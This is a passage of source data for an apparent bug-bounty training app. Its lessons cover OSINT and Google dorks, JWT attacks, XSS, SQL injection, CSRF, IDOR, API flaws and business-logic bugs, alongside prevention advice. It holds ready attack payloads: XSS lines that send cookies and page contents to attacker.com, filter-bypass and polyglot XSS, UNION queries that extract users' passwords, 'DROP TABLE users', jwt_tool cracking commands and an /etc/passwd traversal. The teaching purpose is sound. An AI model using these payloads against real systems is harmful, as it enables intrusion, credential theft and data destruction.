    { type: 'text', content: 'Think like an investigator, not a hacker. Your goal is to build a complete picture of the target: their technology stack, infrastructure, employees, third-party services, historical changes, and potential weaknesses. Every piece of information is a clue. Document everything.' },
    { type: 'callout', variant: 'tip', content: '**Beginner Advice**: Start with passive recon before touching any target. Create a recon folder for each target with subfolders: subdomains, endpoints, tech-stack, employees, leaks, and notes. Organization is the difference between professional and amateur hunting.' },
  ],
};

lessons['osint'] = {
  id: 'osint',
  title: 'OSINT — Open Source Intelligence',
  emoji: '📡',
  sections: [
    { type: 'heading', content: 'OSINT — Open Source Intelligence' },
    { type: 'text', content: 'OSINT is intelligence gathered from publicly available sources. For bug bounty hunters, OSINT is the primary tool for passive recon. The amount of information publicly available about most organizations is staggering — and most of it is voluntarily exposed.' },
    { type: 'subheading', content: 'Key OSINT Sources for Bug Bounty' },
    { type: 'table', headers: ['Source', 'What To Look For', 'Bug Bounty Use'], rows: [
      ['Shodan', 'Internet-connected devices, open ports, services', 'Find exposed databases, dev servers, IoT'],
      ['Censys', 'TLS certificates, subdomains, hosted services', 'Discover subdomains and technologies'],
      ['Wayback Machine', 'Historical website snapshots', 'Find old endpoints, leaked API keys, removed pages'],
      ['Google Search (Dorking)', 'Specific file types, error messages, login pages', 'Find exposed configs, admin panels'],
      ['GitHub', 'Source code, comments, commit messages', 'Find hardcoded secrets, API keys, passwords'],
      ['LinkedIn', 'Employee names, roles, tech stack', 'Social engineering, tech identification'],
      ['WHOIS', 'Domain registration, registrar, dates', 'Identify infrastructure ownership'],
      ['Certificate Transparency (crt.sh)', 'All SSL certificates issued for domain', 'Discover subdomains via SAN entries'],
      ['BuiltWith / Wappalyzer', 'Technologies used on websites', 'Identify frameworks, libraries, version numbers'],
    ]},
    { type: 'subheading', content: 'Google Dorking — Advanced Search Operators' },
    { type: 'text', content: 'Google Dorking uses advanced search operators to find specific information on the web. These queries can reveal exposed files, login pages, and configuration files.' },
    { type: 'code', content: `# Find exposed configuration files
site:target.com filetype:env OR filetype:config OR filetype:xml

# Find login pages
site:target.com inurl:login OR inurl:admin OR inurl:dashboard

# Find specific text in page titles
intitle:"index of" site:target.com

# Find PDFs (often contain sensitive info)
site:target.com filetype:pdf confidential OR internal OR secret

# Find exposed PHP files
site:target.com ext:php intitle:phpinfo

# Find subdomains using "site:" with minus
site:*.target.com -www -mail

# Find error messages
site:target.com "Fatal error" OR "SQL error" OR "Warning:"` },
    { type: 'callout', variant: 'warning', content: '**Legal Note**: OSINT uses public information only. However, some information you find (like leaked credentials) should be handled ethically. Report security findings to the organization through proper channels (HackerOne, Bugcrowd, or their disclosure program). Never use found credentials to access systems without permission.' },
  ],
};

// ======================== LEVEL 5 ========================

lessons['cookies-vs-tokens'] = {
  id: 'cookies-vs-tokens',
  title: 'Cookies vs Tokens',
  emoji: '🍪',
  sections: [
    { type: 'heading', content: 'Cookies vs Tokens — Authentication Strategies' },
    { type: 'text', content: 'Web applications use two primary approaches to maintain authentication state: cookie-based sessions and token-based authentication (like JWT). Each has different security properties, vulnerabilities, and testing approaches.' },
    { type: 'table', headers: ['Aspect', 'Cookie-Based', 'Token-Based (JWT)'], rows: [
      ['Storage Location', 'Browser cookie storage', 'localStorage, sessionStorage, or cookie'],
      ['Sent via', 'Automatic (browser adds Cookie header)', 'Manual (JS adds Authorization header)'],
      ['Server State', 'Stateful — server stores session', 'Stateless — token contains all data'],
      ['XSS Resistance', 'Better (HttpOnly cookies)', 'Weaker (storage accessible via JS)'],
      ['CSRF Resistance', 'Weaker (automatic cookie sending)', 'Better (manual header sending)'],
      ['Mobile Friendly', 'Harder (no browser cookie storage)', 'Easier (just store the token)'],
      ['Scaling', 'Requires shared session store', 'Naturally stateless, scales easily'],
    ]},
    { type: 'concept-chart', chartType: 'security-layers', content: 'Defense in Depth Layers' },
    { type: 'callout', variant: 'warning', content: '**Security Best Practice**: For web applications, HttpOnly cookies with SameSite=Strict provide the best balance of security. localStorage JWTs are convenient but vulnerable to XSS. If using JWTs, store them in HttpOnly cookies with a CSRF token, OR in memory with refresh tokens.' },
    { type: 'subheading', content: 'Testing Checklist' },
    { type: 'list', items: [
      'Are session cookies HttpOnly? If not, XSS can steal them.',
      'Are session cookies Secure? If not, they leak on HTTP.',
      'Is SameSite properly configured? Lax is default in modern browsers.',
      'Can you predict session tokens? Sequential or based on timestamps?',
      'Does logout properly invalidate the session?',
      'Are there concurrent session limits?',
      'Can old sessions be reused after password change?',
      'Is the JWT signature verified? Test with modified payload.',
    ]},
  ],
};

lessons['jwt-basics'] = {
  id: 'jwt-basics',
  title: 'JWT Basics',
  emoji: '🪙',
  sections: [
    { type: 'heading', content: 'JWT (JSON Web Token) Basics' },
    { type: 'text', content: 'JWT is an open standard (RFC 7519) for securely transmitting information between parties as a JSON object. JWTs are digitally signed, so they can be verified and trusted. They are commonly used for authentication and information exchange.' },
    { type: 'subheading', content: 'JWT Structure' },
    { type: 'text', content: 'A JWT consists of three Base64Url-encoded parts separated by dots:' },
    { type: 'subheading', content: 'Common JWT Vulnerabilities' },
    { type: 'table', headers: ['Attack', 'How It Works', 'How to Test'], rows: [
      ['alg=none Attack', 'Server accepts unsigned tokens', 'Change header alg to "none", modify payload'],
      ['Weak HMAC Secret', 'Secret is crackable (rockyou.txt)', 'Use jwt_tool or Hashcat to crack the secret'],
      ['Algorithm Confusion', 'Server uses RSA public key as HMAC secret', 'Change alg from RS256 to HS256, sign with public key'],
      ['Payload Manipulation', 'No signature verification', 'Modify payload, see if server accepts'],
      ['Timing Attacks', 'Leaking valid/invalid through response time', 'Measure response times for different tokens'],
      ['Kid Injection', 'Kid header used unsafely in key retrieval', 'Set kid to "../../etc/passwd" for path traversal'],
      ['Expired Token Reuse', 'No validation of exp claim', 'Use an old, expired token'],
    ]},
    { type: 'code', content: `# Using jwt_tool to analyze JWT
python jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjMiLCJyb2xlIjoidXNlciIsImlhdCI6MTUxNjIzOTAyMn0.some_signature

# Check for "none" algorithm vulnerability
python jwt_tool.py -X a -Ipc -pc role -pv admin <token>

# Try common secret keys
python jwt_tool.py -C -d rockyou.txt <token>` },
    { type: 'callout', variant: 'example', content: '**Real Case**: A bug bounty hunter tested a healthcare application\'s JWT. By changing the algorithm from RS256 to HS256 and using the server\'s public RSA key (which was available at /.well-known/jwks.json) as the HMAC secret, they successfully forged tokens with admin privileges. This is the classic "JWT Algorithm Confusion" attack.' },
  ],
};

// ======================== LEVEL 6 ========================

lessons['xss'] = {
  id: 'xss',
  title: 'XSS — Cross-Site Scripting',
  emoji: '💉',
  sections: [
    { type: 'heading', content: 'XSS — Cross-Site Scripting' },
    { type: 'text', content: 'Cross-Site Scripting (XSS) is a vulnerability that allows attackers to inject malicious JavaScript into web pages viewed by other users. It is consistently ranked in the OWASP Top 10 and is one of the most common web vulnerabilities. XSS can lead to account takeover, data theft, malware distribution, and more.' },
    { type: 'subheading', content: 'The Three Types of XSS' },
    { type: 'table', headers: ['Type', 'How It Works', 'Persistence', 'Severity', 'Example'], rows: [
      ['Reflected XSS', 'Malicious script in URL/request, server reflects it back without sanitization', 'No (only in response)', 'Medium', 'Search page: /search?q=<script>alert(1)</script>'],
      ['Stored XSS', 'Malicious script saved to database (comments, profiles, posts), shown to all visitors', 'Yes (stored in DB)', 'High', 'Comment box that executes JavaScript when viewing the page'],
      ['DOM-based XSS', 'Vulnerability exists entirely in client-side JavaScript, no server involvement', 'No (client-side only)', 'Medium', 'URL fragment read by JS and written to innerHTML'],
    ]},
    { type: 'subheading', content: 'Reflected XSS — Deep Dive' },
    { type: 'text', content: 'Reflected XSS is the simplest type. The attacker crafts a URL containing malicious JavaScript, sends it to the victim (via phishing email, social media, etc.), and when the victim clicks it, the server reflects the script in the response and the browser executes it.' },

    { type: 'mermaid', chartType: 'flowchart', content: `flowchart LR
    A[Attacker] -->|Injects script| B[Server]
    B -->|Stores/reflects| C[Victim Browser]
    C -->|Executes script| D[Steals Cookie]
    D -->|Sends to attacker| A
    
    subgraph Attack Flow
    A
    B
    C
    D
    end` },
    { type: 'canvas-animation', animationType: 'xss-attack', content: 'XSS Attack Animation' },
    { type: 'callout', variant: 'info', content: '**XSS Payload Examples**: \n• `<script>alert("XSS")</script>` — Basic proof of concept\n• `<img src=x onerror=fetch("https://attacker.com/?c="+document.cookie)>` — Cookie theft\n• `<body onload=document.location="https://attacker.com/steal?data="+btoa(document.body.innerHTML)>` — Page content theft' },
    { type: 'subheading', content: 'XSS Prevention' },
    { type: 'list', items: [
      '**Contextual Output Encoding** — Encode data based on where it appears (HTML body, attribute, JavaScript, CSS, URL). Use libraries like OWASP Java Encoder or DOMPurify.',
      '**Content Security Policy (CSP)** — Restrict what scripts can execute. Use nonces or hashes for inline scripts. CSP can\'t prevent all XSS but dramatically limits impact.',
      '**Input Validation** — Validate input on server side. Whitelist allowed characters when possible.',
      '**HttpOnly Cookies** — Prevent cookie theft even if XSS is found.',
      '**Avoid Dangerous Functions** — Never use innerHTML, document.write, or eval with user-controlled data.',
    ]},
    { type: 'subheading', content: 'Testing for XSS' },
    { type: 'code', content: `# Basic XSS test payloads to try in input fields/params

# Simple alert
<script>alert(1)</script>

# HTML injection
<img src=x onerror=alert(1)>

# Bypass filters with different contexts
"><script>alert(1)</script>
<scr<script>ipt>alert(1)</scr<script>ipt>

# Polyglot (works in multiple contexts)
jaVasCript:/*-/*\`/*\`/*'/*"/**/(/* */onerror=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(1)//>\x3e

# No script tags — event handlers
<svg/onload=alert(1)>
<details/open/ontoggle=alert(1)>
<body/onload=alert(1)>` },
  ],
};

lessons['sql-injection'] = {
  id: 'sql-injection',
  title: 'SQL Injection',
  emoji: '💾',
  sections: [
    { type: 'heading', content: 'SQL Injection — The Database Attacker\'s Best Friend' },
    { type: 'text', content: 'SQL Injection (SQLi) is a code injection technique where an attacker inserts malicious SQL statements into application queries. It is one of the oldest, most dangerous, and most impactful web vulnerabilities. A successful SQLi can lead to data theft, data modification, authentication bypass, and even remote code execution on the database server.' },
    { type: 'mermaid', chartType: 'flowchart', content: `flowchart TD
    A[User Input] --> B{Sanitized?}
    B -->|No| C[Direct SQL Concatenation]
    C --> D[Malicious Query Built]
    D --> E[Database Executes]
    E --> F{Injected?}
    F -->|Yes| G[Data Leak / Deletion / Auth Bypass]
    F -->|No| H[Normal Result]
    
    B -->|Yes| I[Parameterized Query]
    I --> H` },
    { type: 'concept-chart', chartType: 'vuln-impact', content: 'SQL Injection Impact Chart' },
    { type: 'callout', variant: 'definition', content: '**SQL Injection**: A web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. It occurs when user-supplied data is included in SQL queries without proper sanitization or parameterization.' },
    { type: 'subheading', content: 'How SQL Injection Works' },
    { type: 'text', content: 'SQLi exploits the fact that SQL queries are constructed by concatenating strings. When user input is directly included in a query string, the user can "break out" of the intended query and inject their own SQL commands.' },
    { type: 'code', content: `// Example: User login query

// Intended SQL:
SELECT * FROM users WHERE username = 'user_input' AND password = 'user_input'

// Normal input: username=alice, password=secret
SELECT * FROM users WHERE username = 'alice' AND password = 'secret'
// Returns: alice's row if password matches

// Malicious input: username=admin' --, password=anything
SELECT * FROM users WHERE username = 'admin' --' AND password = 'anything'
// The -- comments out the password check!
// Returns: admin's row (AUTH BYPASS!)

// Malicious input: username=' OR 1=1 --, password=anything
SELECT * FROM users WHERE username = '' OR 1=1 --' AND password = 'anything'
// Returns: EVERY user row (COMPLETE BYPASS!)

// Malicious input: username='; DROP TABLE users; --
SELECT * FROM users WHERE username = ''; DROP TABLE users; --' AND password = ''
// Deletes the entire users table! (DESTRUCTIVE!)` },
    { type: 'subheading', content: 'Types of SQL Injection' },
    { type: 'table', headers: ['Type', 'Description', 'How It Works', 'Detection'], rows: [
      ['In-band (Error-based)', 'Uses error messages from database', 'Inject query that causes SQL error, info in error', 'Add \' or " to input, look for SQL errors'],
      ['In-band (Union-based)', 'Uses UNION to combine results', 'UNION SELECT adds attacker\'s data to response', 'Test UNION with different column counts'],
      ['Blind (Boolean-based)', 'No data returned, infer from true/false responses', 'Compare responses: \' AND 1=1 vs \' AND 1=2', 'Check if page content differs between conditions'],
      ['Blind (Time-based)', 'Infer from response delays', '\' IF(1=1, SLEEP(5), 0) — delay if true', 'Measure response time differences'],
      ['Out-of-band', 'Data exfiltrated through different channel', 'Use database to make DNS/HTTP request to attacker', 'Monitor for DNS/HTTP callbacks'],
    ]},
    { type: 'callout', variant: 'example', content: '**Real Impact**: In 2022, a bug bounty hunter found a SQL injection in a popular travel booking API. The vulnerable parameter was a "currency" field — expected values were "USD", "EUR", etc. By injecting SQL into this parameter, the hunter could extract the entire user database: 10+ million records. Severity: Critical. Bounty: $25,000.' },
    { type: 'subheading', content: 'Testing for SQL Injection' },
    { type: 'code', content: `# Basic SQLi test payloads

# Single quote test
' 
" 
%27 

# Boolean tests (compare responses)
' AND 1=1 --
' AND 1=2 --

# Time-based test
' WAITFOR DELAY '0:0:5' --  (SQL Server)
' AND SLEEP(5) --  (MySQL)
' AND pg_sleep(5) --  (PostgreSQL)

# UNION-based (find column count)
' ORDER BY 1 --
' ORDER BY 2 --
' ORDER BY 3 --
# (keep incrementing until error, then previous number is column count)

# UNION SELECT (extract data)
' UNION SELECT 1,2,3 --
' UNION SELECT table_name,2,3 FROM information_schema.tables --
' UNION SELECT username,password,3 FROM users --` },
    { type: 'callout', variant: 'tip', content: '**Pro Tip**: SQLMap is a powerful automated SQLi tool, but beginners should learn manual exploitation first. Manual testing helps you understand the vulnerability deeply and find SQLi that automated tools miss (especially in JSON parameters, headers, and complex WAF bypasses).' },
    { type: 'subheading', content: 'Prevention' },
    { type: 'list', items: [
      '**Parameterized Queries (Prepared Statements)** — The ONLY definitive defense. SQL code and data are always separate.',
      '**Stored Procedures** — Can help but can still be vulnerable if they use dynamic SQL.',
      '**Input Validation** — Whitelist validation can reduce attack surface but is not sufficient alone.',
      '**Least Privilege** — Database accounts should have minimum necessary permissions. Don\'t use sa/root for web apps.',
      '**WAF (Web Application Firewall)** — Can block many SQLi attempts but should not be relied upon exclusively.',
    ]},
  ],
};

lessons['csrf'] = {
  id: 'csrf',
  title: 'CSRF — Cross-Site Request Forgery',
  emoji: '🔄',
  sections: [
    { type: 'heading', content: 'CSRF — Cross-Site Request Forgery' },
    { type: 'text', content: 'Cross-Site Request Forgery (CSRF, pronounced "sea-surf") is an attack that forces an authenticated user to execute unwanted actions on a web application. The attacker tricks the victim\'s browser into sending a forged request to a target site where the victim is already authenticated.' },
    { type: 'subheading', content: 'How CSRF Works' },

    { type: 'mermaid', chartType: 'sequenceDiagram', content: `sequenceDiagram
    participant User
    participant Bank
    participant Attacker
    User->>Bank: Login (gets session cookie)
    User->>Attacker: Visits malicious site
    Attacker->>User: Auto-submits hidden form
    User->>Bank: POST /transfer (with cookie!)
    Bank->>Bank: Validates cookie - passes!
    Bank-->>User: $1000 transferred to attacker` },
    { type: 'concept-chart', chartType: 'attack-chain', content: 'CSRF Attack Chain' },
    { type: 'callout', variant: 'warning', content: '**Key Insight**: CSRF works because browsers automatically attach cookies to every request to a domain, regardless of where the request originated. The server can\'t distinguish between a legitimate form submission and a forged one without additional protections.' },
    { type: 'subheading', content: 'CSRF Prevention' },
    { type: 'table', headers: ['Method', 'How It Works', 'Effectiveness'], rows: [
      ['CSRF Tokens', 'Server generates unique token, embedded in forms, validated on submission', 'Excellent — standard defense'],
      ['SameSite Cookies', 'Cookie attribute: browser only sends cookie on same-site requests', 'Very Good — modern browser default'],
      ['Custom Headers', 'API calls require custom header (X-Requested-With: XMLHttpRequest)', 'Good — browser enforces CORS'],
      ['Double Submit Cookie', 'Send CSRF token in both cookie and request body, server compares', 'Good — but requires matching logic'],
      ['Re-authentication', 'Require password for sensitive actions (password change, money transfer)', 'Excellent — but impacts UX'],
    ]},
  ],
};

lessons['idor'] = {
  id: 'idor',
  title: 'IDOR — Insecure Direct Object Reference',
  emoji: '🔑',
  sections: [
    { type: 'heading', content: 'IDOR — Insecure Direct Object Reference' },
    { type: 'text', content: 'Insecure Direct Object Reference (IDOR) is an access control vulnerability where a user can access objects (data, files, records) that belong to other users by manipulating a direct reference to the object. IDORs are extremely common and often lead to high-severity findings.' },
    { type: 'callout', variant: 'definition', content: '**IDOR (Insecure Direct Object Reference)**: A type of broken access control where an application exposes a direct reference to an internal implementation object, such as a database key or filename, without proper authorization checks.' },
    { type: 'subheading', content: 'IDOR Examples' },
    { type: 'code', content: `// EXAMPLE 1: Sequential IDs
// Normal request
GET /api/user/123 → Returns current user's profile

// Vulnerable — change the ID
GET /api/user/124 → Returns another user's profile!
GET /api/user/125 → Returns yet another user's profile!

// EXAMPLE 2: UUID in URL
GET /api/invoice/a1b2c3d4 → Returns invoice
// Try: GET /api/invoice/e5f6g7h8 → Returns another user's invoice
// Even with UUIDs, if you can find/guess other IDs, you can exploit

// EXAMPLE 3: ID in request body
POST /api/order/cancel
Body: {"order_id": 12345}
// Try: Body: {"order_id": 12346} → Cancels someone else's order

// EXAMPLE 4: File access
GET /download?file=report_123.pdf
// Try: GET /download?file=report_124.pdf
// Or: GET /download?file=../../etc/passwd (path traversal + IDOR)` },
    { type: 'subheading', content: 'Testing Methodology' },
    { type: 'list', items: [
      '**Find Identifiers**: Look for IDs, UUIDs, email addresses, usernames, invoice numbers, order IDs in URLs, request bodies, and cookies.',
      '**Increment/Decrement**: Try changing numeric IDs by ±1, ±10, ±100.',
      '**UUID Guessing**: If UUID is v1 (timestamp-based) or weak, you can predict other users\' UUIDs.',
      '**HTTP Method Switch**: Try GET, PUT, PATCH, DELETE on other users\' resources.',
      '**API Endpoint Variations**: Try /api/v2/users/me vs /api/v2/users/123.',
      '**Check Headers**: Some apps put user ID in custom headers or cookies.',
    ]},
    { type: 'callout', variant: 'example', content: '**Real Case**: A researcher found an IDOR in a major social media platform\'s "Download Your Data" feature. By changing the user_id parameter in the API request, they could download ANY user\'s complete data archive — messages, photos, location history, and more. Severity: Critical. Bounty: $50,000.' },
  ],
};

// ======================== LEVEL 7 ========================

lessons['api-security'] = {
  id: 'api-security',
  title: 'API Security',
  emoji: '🔌',
  sections: [
    { type: 'heading', content: 'API Security' },
    { type: 'text', content: 'Modern applications are API-first. Mobile apps, SPAs, and third-party integrations all rely on APIs. This creates enormous attack surface. Understanding API security is essential for modern bug bounty hunting.' },
    { type: 'concept-chart', chartType: 'owasp-top10', content: 'OWASP Top 10 Overview' },
    { type: 'subheading', content: 'OWASP API Security Top 10' },
    { type: 'table', headers: ['Rank', 'Category', 'Description'], rows: [
      ['API1', 'Broken Object Level Authorization (BOLA)', 'Accessing other users\' data via object IDs'],
      ['API2', 'Broken Authentication', 'Weak or missing authentication mechanisms'],
      ['API3', 'Broken Object Property Level Authorization', 'Accessing/mass-assigning unauthorized properties'],
      ['API4', 'Unrestricted Resource Consumption', 'No rate limiting, DoS via expensive queries'],
      ['API5', 'Broken Function Level Authorization', 'Regular users accessing admin functions'],
      ['API6', 'Unrestricted Access to Sensitive Business Flows', 'Automated abuse of business-critical flows'],
      ['API7', 'Server Side Request Forgery (SSRF)', 'Making server request to internal resources'],
      ['API8', 'Security Misconfiguration', 'Missing headers, CORS, verbose errors'],
      ['API9', 'Improper Inventory Management', 'Old API versions still accessible'],
      ['API10', 'Unsafe Consumption of APIs', 'Trusting third-party API responses without validation'],
    ]},
    { type: 'subheading', content: 'API Testing Methodology' },
    { type: 'list', items: [
      '**Document All Endpoints**: Map every API endpoint. Check JavaScript files, mobile app traffic, and API documentation.',
      '**Test HTTP Methods**: What happens with PUT instead of GET? DELETE on a GET-only endpoint?',
      '**Parameter Fuzzing**: Send unexpected types, null values, empty strings, arrays, and special characters.',
      '**Test Authorization**: Access endpoints as different user roles (anonymous, user, admin).',
      '**Check Response Data**: Does the API return more data than the UI shows? Hidden fields in JSON responses?',
      '**Rate Limit Testing**: Can you brute force or scrape without rate limiting?',
      '**CORS Misconfiguration**: Is the API accessible from arbitrary origins?',
    ]},
    { type: 'code', content: `# API discovery — check JS files for endpoints
grep -oP '"/api/[^"]+"' app.js | sort -u

# Test parameter pollution
GET /api/users?id=123&id=456

# Test with different content types
Content-Type: application/json
Content-Type: application/xml
Content-Type: application/x-www-form-urlencoded

# Check for hidden parameters
POST /api/reset-password
{"email":"victim@test.com","is_admin":true}` },
  ],
};

lessons['business-logic-bugs'] = {
  id: 'business-logic-bugs',
  title: 'Business Logic Bugs',
  emoji: '🧠',
  sections: [
    { type: 'heading', content: 'Business Logic Bugs' },
    { type: 'text', content: 'Business logic vulnerabilities are flaws in the design and logic of an application\'s workflow — not technical implementation issues. They require understanding WHAT the application should do and testing if you can make it do something unexpected.' },
    { type: 'callout', variant: 'definition', content: '**Business Logic Bug**: A vulnerability that exploits how an application\'s intended business rules and workflows can be manipulated for unintended outcomes. These are NOT traditional technical vulnerabilities like XSS or SQLi.' },
    { type: 'subheading', content: 'Common Business Logic Patterns' },
    { type: 'table', headers: ['Pattern', 'Example', 'Impact'], rows: [
      ['Negative Values', 'Negative quantity in shopping cart', 'Negative price, get paid to buy'],
      ['Excessive Quantities', 'Buying 10,000 items with flat shipping', 'Shipping cost bypass'],
      ['Race Conditions', 'Two simultaneous withdrawal requests', 'Double spending / infinite money'],
      ['Coupon Abuse', 'Applying same coupon multiple times', 'Unlimited discounts'],
      ['Price Manipulation', 'Modifying hidden price field', 'Paying less than actual price'],
      ['Workflow Bypass', 'Skipping payment step in checkout', 'Free products'],
      ['Privilege Escalation via Workflow', 'Registering as user, modifying signup request to become admin', 'Unauthorized admin access'],
      ['OTP/2FA Bypass', 'Manipulating step parameter in multi-step form', 'Bypassing authentication'],
    ]},
    { type: 'code', content: `// Example: Price manipulation during checkout

// Normal request
POST /api/cart/checkout
{
  "items": [
    {"product_id": 101, "quantity": 1, "price": 49.99}
  ],
  "coupon": "SAVE10",
  "total": 39.99
}

// Attack: modify the price
POST /api/cart/checkout
{
  "items": [
    {"product_id": 101, "quantity": 1, "price": 0.01}
  ],
  "coupon": "SAVE10",
  "total": 0.01
}
// If server trusts client-side price calculation → Pay $0.01 for $49.99 item` },
    { type: 'callout', variant: 'example', content: '**Real Case**: A ride-sharing app allowed applying multiple promo codes. A researcher found they could apply the same "$10 off" code 100 times by using different API parameters. The system didn\'t check if the code was already used by the account — only if it was valid. Result: free rides worth thousands of dollars. Bounty: $15,000.' },
  ],
};

lessons['rate-limiting'] = {
  id: 'rate-limiting',
  title: 'Rate Limiting Issues',
  emoji: '🚦',
  sections: [
    { type: 'heading', content: 'Rate Limiting Issues' },
    { type: 'text', content: 'Rate limiting controls how many requests a client can make in a given time period. When rate limiting is missing or weak, attackers can brute force credentials, enumerate users, scrape data, or cause denial of service.' },
    { type: 'subheading', content: 'Types of Rate Limiting' },
    { type: 'table', headers: ['Approach', 'Basis', 'Weakness'], rows: [
      ['Per IP', 'Count requests from IP address', 'VPN, proxy, or botnet bypass'],
      ['Per User', 'Count requests per authenticated user', 'Only works for authenticated endpoints'],
      ['Per Session', 'Count requests per session token', 'Rotating session tokens bypasses'],
      ['Global', 'Total requests to server', 'High latency for all users'],
      ['Endpoint-Specific', 'Per-endpoint limits', 'Only protects specific endpoints'],
    ]},
    { type: 'subheading', content: 'Testing Methodology' },
    { type: 'list', items: [
      '**Send rapid requests** to login, password reset, and OTP endpoints.',
      '**Test with different source IPs** (VPN, proxies, IPv6) to see if IP-based.',
      '**Rotate session tokens** between requests to bypass session-based limits.',
      '**Check HTTP headers** for X-RateLimit-*, Retry-After headers.',
      '**Test different endpoints** — rate limits often apply only to specific routes.',
      '**Test with different HTTP methods** — limits may apply to POST but not GET.',
    ]},
  ],
};

export function getLesson(topicId: string): LessonTopic | undefined {
  return lessons[topicId];
}

export function getAllLessons(): Record<string, LessonTopic> {
  return lessons;
}

export function getLessonForLevel(levelNum: number, topicIndex: number): LessonTopic | undefined {
  const mapping: Record<number, string[]> = {
    1: ['what-is-the-internet', 'client-vs-server', 'how-websites-load', 'dns-basics', 'http-vs-https'],
    2: ['request-methods', 'headers-and-cookies', 'status-codes', 'request-response-lifecycle'],
    3: ['frontend-vs-backend', 'rest-apis', 'databases-overview', 'monolith-vs-microservices'],
    4: ['reconnaissance-theory', 'osint', 'public-website-footprint', 'tech-stack-detection'],
    5: ['cookies-vs-tokens', 'jwt-basics', 'session-management', 'login-security'],
    6: ['xss', 'sql-injection', 'csrf', 'idor'],
    7: ['api-security', 'business-logic-bugs', 'rate-limiting', 'bug-bounty-workflow'],
  };
  const ids = mapping[levelNum];
  if (!ids || topicIndex < 0 || topicIndex >= ids.length) return undefined;
  return lessons[ids[topicIndex]];
}

export function getLessonByLevelAndIndex(levelNum: number, topicIndex: number): LessonTopic | undefined {
  const mapping: Record<number, string[]> = {
    1: ['what-is-the-internet', 'client-vs-server', 'how-websites-load', 'dns-basics', 'http-vs-https'],
    2: ['request-methods', 'headers-and-cookies', 'status-codes', 'request-response-lifecycle'],
    3: ['frontend-vs-backend', 'rest-apis', 'databases-overview', 'monolith-vs-microservices'],
    4: ['reconnaissance-theory', 'osint', 'public-website-footprint', 'tech-stack-detection'],
    5: ['cookies-vs-tokens', 'jwt-basics', 'session-management', 'login-security'],
    6: ['xss', 'sql-injection', 'csrf', 'idor'],
    7: ['api-security', 'business-logic-bugs', 'rate-limiting', 'bug-bounty-workflow'],
  };
  const ids = mapping[levelNum];
  if (!ids || topicIndex < 0 || topicIndex >= ids.length) return undefined;
  return lessons[ids[topicIndex]];
}

// Stub topics that map to existing lessons
lessons['request-response-lifecycle'] = {
  id: 'request-response-lifecycle',
  title: 'Request-Response Lifecycle',
  emoji: '🔄',
  sections: [
    { type: 'heading', content: 'Request-Response Lifecycle' },
    { type: 'text', content: 'Every interaction on the web follows a request-response cycle. Understanding this lifecycle helps you identify where things can go wrong — and where vulnerabilities hide.' },
    { type: 'subheading', content: 'Full Lifecycle' },
    { type: 'list', items: [
      '**Step 1: DNS Resolution** — Browser resolves domain to IP address.',
      '**Step 2: TCP Connection** — Browser opens TCP connection to server (3-way handshake).',
      '**Step 3: TLS Handshake** — If HTTPS, secure connection established.',
      '**Step 4: HTTP Request** — Browser sends HTTP request with method, path, headers, and body.',
      '**Step 5: Server Processing** — Server receives request, routes to handler, processes logic.',
      '**Step 6: Backend Operations** — Server may query database, call other APIs, process files.',
      '**Step 7: HTTP Response** — Server sends response with status code, headers, and body.',
      '**Step 8: Browser Rendering** — Browser parses response and renders the page.',
      '**Step 9: Additional Requests** — Browser discovers and requests additional resources.',
    ]},
    { type: 'architecture-svg', svgType: 'request-response', content: 'Full Request-Response Lifecycle' },
    { type: 'canvas-animation', animationType: 'tcp-handshake', content: 'TCP 3-Way Handshake Animation' },
    { type: 'callout', variant: 'info', content: '**Bug Bounty Angle**: Each step has potential vulnerabilities. DNS: cache poisoning. TCP: SYN flood attacks. TLS: downgrade attacks. Request: parameter pollution, header injection. Server processing: injection attacks. Database: SQLi. Response: information disclosure. Browser: XSS.' },
  ],
};

lessons['monolith-vs-microservices'] = {
  id: 'monolith-vs-microservices',
  title: 'Monolith vs Microservices',
  emoji: '🏗️',
  sections: [
    { type: 'heading', content: 'Monolith vs Microservices' },
    { type: 'text', content: 'The architecture of an application determines its security posture and attack surface.' },
    { type: 'table', headers: ['Aspect', 'Monolith', 'Microservices'], rows: [
      ['Definition', 'Single application handling everything', 'Many small services communicating via APIs'],
      ['Deployment', 'One big deploy', 'Independent service deployments'],
      ['Attack Surface', 'Single entry point', 'Multiple entry points (each service)'],
      ['Security', 'Simple perimeter defense', 'Complex — service-to-service trust issues'],
      ['Testing', 'Test one app', 'Test many services and their interactions'],
      ['Bug Hunting', 'Easier to understand', 'Harder — more moving parts, more misconfigurations'],
    ]},
  ],
};

lessons['public-website-footprint'] = {
  id: 'public-website-footprint',
  title: 'Public Website Footprint',
  emoji: '🌍',
  sections: [
    { type: 'heading', content: 'Public Website Footprint' },
    { type: 'text', content: 'A target\'s public website footprint includes every publicly accessible part of their online presence. This is a goldmine of information for recon.' },
    { type: 'subheading', content: 'What to Check' },
    { type: 'list', items: [
      '**robots.txt** — Disallowed paths often contain admin areas or hidden functionality.',
      '**sitemap.xml** — Every page the site wants indexed. Maps the entire site.',
      '**/.well-known/** — Security.txt, openid-configuration, pki-validation.',
      '**JavaScript Files** — Endpoints, API keys, internal logic, comments with sensitive info.',
      '**Source Maps (.map)** — Full source code if source maps are deployed to production.',
      '**404 Pages** — Custom 404 pages may leak information about the server.',
      '**Error Pages** — Stack traces, database errors, file paths.',
      '**Job Postings** — Tech stack, infrastructure details, team structure.',
    ]},
  ],
};

lessons['tech-stack-detection'] = {
  id: 'tech-stack-detection',
  title: 'Tech Stack Detection Concepts',
  emoji: '🔬',
  sections: [
    { type: 'heading', content: 'Tech Stack Detection Concepts' },
    { type: 'text', content: 'Identifying the technologies a target uses is critical for finding known vulnerabilities and choosing the right testing approach.' },
    { type: 'subheading', content: 'Passive Detection Methods' },
    { type: 'list', items: [
      '**HTTP Headers** — Server header, X-Powered-By, Set-Cookie patterns reveal tech.',
      '**Job Postings** — Companies list their tech stack in job descriptions.',
      '**GitHub** — Company repos, npm packages, dependencies reveal technologies.',
      '**Wappalyzer** — Browser extension that identifies tech from page source and headers.',
      '**BuiltWith** — Online tool for comprehensive tech stack detection.',
      '**Error Messages** — Verbose errors reveal framework and version.',
      '**Cookie Names** — Session cookie names often reveal the framework (PHPSESSID, JSESSIONID, ASP.NET_SessionId).',
    ]},
  ],
};

lessons['session-management'] = {
  id: 'session-management',
  title: 'Session Management',
